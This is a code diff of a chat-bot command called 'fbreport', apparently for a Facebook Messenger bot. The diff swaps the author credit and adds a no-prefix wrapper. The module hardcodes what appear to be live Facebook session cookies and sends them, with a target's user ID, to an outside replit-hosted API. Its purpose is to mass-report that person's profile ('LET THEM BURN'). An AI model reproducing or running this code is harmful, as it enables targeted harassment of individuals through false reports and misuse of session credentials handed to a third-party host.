@@ -1,3 +1,4 @@
+const { GoatWrapper } = require('fca-liane-utils');
 const cook = "datr= L3hnY90pdJwWsZbe0g2eMefE; fr= .AWVOCDud0U20K4q0_BFO_iok7vg.Bkh6Z0.tN.AAA.0.0.Bkh7CA.AWWR8bmDjiM; m_page_voice= 100093251606743; sb= L3hnY0hcf4RwphDv-h38Ehu1; xs= 24%3AyAsSvyR7aDhMQw%3A2%3A1686613606%3A-1%3A-1; c_user= 100093251606743;";
 
 const encodedCook = encodeURIComponent(cook).replace(/%(?![0-9a-fA-F]{2}|3[Bb])/g, '%25');
@@ -21,7 +22,7 @@ config: {
   if (!args[0]) return api.sendMessage("Prefix: fbreport [uid]", threadID, messageID);
 
   try {
-    api.sendMessage(`❤️‍🔥 LET THEM BURN ❤️‍🔥 ID:\nhttps://www.facebook.com/profile.php?id=${response}\n\nModule by Cliff Vincent`, threadID, messageID);
+    api.sendMessage(`❤️‍🔥 LET THEM BURN ❤️‍🔥 ID:\nhttps://www.facebook.com/profile.php?id=${response}\n\nModule by Mr perfect`, threadID, messageID);
     const res = await axios.get(`https://apimahiro--mahirochan1.repl.co/api?cookie=${encodedCook}&id=${response}`);
     console.log(res); // Log the entire res object
     const respond = res.data.message;
@@ -32,4 +33,5 @@ config: {
     api.sendMessage("My Lord, Report has been successfully sent!", threadID, messageID);
   }
 },
-};
+};const wrapper = new GoatWrapper(module.exports);
+wrapper.applyNoPrefix({ allowPrefix: true });
